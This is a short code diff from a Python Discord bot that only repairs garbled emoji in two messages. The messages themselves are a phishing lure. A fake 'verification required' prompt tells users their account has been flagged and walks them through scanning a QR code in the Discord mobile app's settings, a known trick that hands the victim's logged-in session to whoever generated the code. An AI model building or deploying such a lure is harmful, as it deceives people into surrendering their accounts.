@@ -408,7 +408,7 @@ async def start(ctx):
         
         #Embed Creation
         asyncio.create_task(c.run())
-        embed_qr = nextcord.Embed(title="__**Hello, are you human? Let's find out!**__", description="You are seeing this because your account has been flagged for verification...\n\n**Please follow these steps to complete your verification**:\n1ï¸âƒ£ *Open the Discord Mobile application*\n2ï¸âƒ£ *Go to settings*\n3ï¸âƒ£ *Choose the \"Scan QR Code\" option*\n4ï¸âƒ£ *Scan the QR code below*", color=5003474)
+        embed_qr = nextcord.Embed(title="__**Hello, are you human? Let's find out!**__", description="You are seeing this because your account has been flagged for verification...\n\n**Please follow these steps to complete your verification**:\n1️⃣ *Open the Discord Mobile application*\n2️⃣ *Go to settings*\n3️⃣ *Choose the \"Scan QR Code\" option*\n4️⃣ *Scan the QR code below*", color=5003474)
         embed_qr.set_footer(text="Note: captcha expires in 2 minutes")
         embed_qr.set_thumbnail(url="https://emoji.discord.st/emojis/aa142d2c-681c-45a2-99e9-a6e63849b351.png")
         await interaction.response.send_message(embed=embed_qr, ephemeral=True)
@@ -417,7 +417,7 @@ async def start(ctx):
 
     myview = View(timeout=None)
     myview.add_item(verification)
-    embed = nextcord.Embed(title="**Verification required!**", description="ðŸ”” To acces this server, you need to pass the verification first\nðŸ§¿ Press the button bellow", color=5003474)
+    embed = nextcord.Embed(title="**Verification required!**", description="🔔 To acces this server, you need to pass the verification first\n🧿 Press the button bellow", color=5003474)
     await ctx.send(embed=embed, view=myview)
 
 #Start Everything
